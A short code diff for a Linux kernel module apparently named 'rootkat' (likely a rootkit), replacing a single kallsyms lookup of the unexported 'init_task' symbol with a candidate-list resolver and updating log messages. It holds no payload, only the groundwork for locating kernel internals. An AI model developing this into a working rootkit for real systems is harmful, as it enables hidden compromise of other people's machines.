@@ -3,11 +3,16 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include "kallsyms.h"
+#include "resolver.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
 static int __init rootkat_init(void)
 {
+	static const char * const init_task_candidates[] = {
+		"init_task", NULL,
+	};
+	const char *matched = NULL;
 	unsigned long addr;
 	int rc;
 
@@ -19,12 +24,12 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
-	addr = rootkat_lookup_name("init_task");
+	addr = rootkat_resolve(init_task_candidates, &matched);
 	if (!addr) {
-		pr_err(ROOTKAT_TAG "could not resolve init_task\n");
+		pr_err(ROOTKAT_TAG "init_task resolution failed\n");
 		return -ENOENT;
 	}
-	pr_info(ROOTKAT_TAG "init_task @ %lx\n", addr);
+	pr_info(ROOTKAT_TAG "init_task (%s) @ %lx\n", matched, addr);
 
 	pr_info(ROOTKAT_TAG "loaded\n");
 	return 0;
